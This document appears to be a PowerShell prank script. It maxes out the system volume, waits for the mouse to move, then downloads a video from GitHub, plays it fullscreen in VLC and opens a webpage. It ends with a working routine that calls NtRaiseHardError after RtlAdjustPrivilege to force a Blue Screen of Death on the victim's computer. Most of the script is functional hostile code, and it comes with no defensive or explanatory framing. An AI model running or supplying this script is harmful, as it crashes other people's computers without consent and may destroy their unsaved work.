# This turns the volume up to max level
$k=[Math]::Ceiling(100/2)
$o=New-Object -ComObject WScript.Shell
for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class Mouse {
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);

    public struct POINT {
        public int X;
        public int Y;
    }
}
"@

$point = New-Object Mouse+POINT
$null = [Mouse]::GetCursorPos([ref]$point)
$initialX = $point.X
$initialY = $point.Y

while ($true) {
    Start-Sleep -Milliseconds 100
    $null = [Mouse]::GetCursorPos([ref]$point)
    if ($point.X -ne $initialX -or $point.Y -ne $initialY) {
        # Mouse has moved, download the video
        $url = "https://github.com/MajorMarmalade/Sounds/raw/main/Mario/mario.wmv"
        $output = "$env:TEMP\mario.wmv"
        Invoke-WebRequest -Uri $url -OutFile $output
        # Play the video in fullscreen with VLC
        Start-Process "C:\Program Files\VideoLAN\VLC\vlc.exe" -ArgumentList "`"$output`" -f"
        # Wait for the video to finish
        Start-Sleep -Seconds 10  # Adjust this to the length of your video
        # Open a webpage
        $webpage = "http://example.com"
        Start-Process $webpage

        # -------------------
       
# This section will trigger a BSOD to the users computer
$source = @"
using System;
using System.Runtime.InteropServices;
public static class CS{
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege,     out bool PreviousValue);
    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    public static unsafe void Kill(){
        Boolean tmp1;
        uint tmp2;
        RtlAdjustPrivilege(19, true, false, out tmp1);
        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
    }
}
"@
$comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
$comparams.CompilerOptions = '/unsafe'
$a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
[CS]::Kill()
       
 	# -------------------

        break
    }
}
